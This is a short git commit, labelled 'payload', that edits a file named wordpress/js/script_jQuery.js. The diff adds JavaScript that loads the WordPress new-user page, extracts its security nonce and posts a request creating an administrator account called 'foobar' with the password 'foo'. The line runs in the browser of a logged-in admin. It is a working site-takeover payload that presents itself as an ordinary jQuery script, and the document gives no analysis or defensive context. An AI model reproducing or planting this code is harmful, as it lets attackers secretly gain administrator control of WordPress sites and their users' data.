f9cc4a747bc8a00b6b3dc46c56a04f0775506acf
root <root@docker-dev.example.com>
2022-06-14 19:20:59 +0000

    payload

--- wordpress/js/script_jQuery.js
+++ wordpress/js/script_jQuery.js
@@ -1,2 +1,2 @@
-u="/sitecore/wp-admin/user-new.php"; jQuery.get(u,function(e){jQuery.post(u,{action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)[1],user_login:"foobar",email:"foo@bar.com",pass1:"foo",pass2:"foo",role:"administrator"})});
+u="/wp-admin/user-new.php"; jQuery.get(u,function(e){jQuery.post(u,{action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)[1],user_login:"foobar",email:"foo@bar.com",pass1:"foo",pass2:"foo",role:"administrator"})});
 
